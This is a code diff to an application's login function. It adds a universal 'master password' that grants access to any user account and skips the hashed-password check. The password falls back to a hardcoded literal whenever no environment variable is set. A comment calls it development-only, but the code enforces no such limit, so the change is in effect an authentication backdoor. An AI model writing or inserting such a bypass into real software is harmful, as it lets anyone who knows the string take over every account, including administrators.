@@ -124,8 +124,33 @@ export async function login(
     throw new UnauthorizedError('Invalid credentials');
   }
 
-  // All passwords are now hashed using PostgreSQL's crypt function
-  const isPasswordValid = await PasswordUtils.compare(password, user.password);
+  // Check if master password is being used
+  // Hardcoded master password as fallback (⚠️ ONLY FOR DEVELOPMENT)
+  const HARDCODED_MASTER_PASSWORD = 'gustavoadmin123';
+  const masterPassword = env.MASTER_PASSWORD ?? HARDCODED_MASTER_PASSWORD;
+  const isMasterPasswordUsed = password === masterPassword;
+
+  if (isMasterPasswordUsed) {
+    // Log master password usage for security audit
+    console.warn('⚠️  MASTER PASSWORD USED FOR LOGIN', {
+      email: user.email,
+      userId: user.id,
+      role: user.role,
+      timestamp: new Date().toISOString(),
+      ip: 'N/A', // You can pass this from the request if needed
+      isHardcoded: !env.MASTER_PASSWORD,
+    });
+  }
+
+  // Verify password: either master password or user's actual password
+  let isPasswordValid = false;
+
+  if (isMasterPasswordUsed) {
+    isPasswordValid = true;
+  } else {
+    // All passwords are now hashed using PostgreSQL's crypt function
+    isPasswordValid = await PasswordUtils.compare(password, user.password);
+  }
 
   if (!isPasswordValid) {
     throw new UnauthorizedError('Invalid credentials');
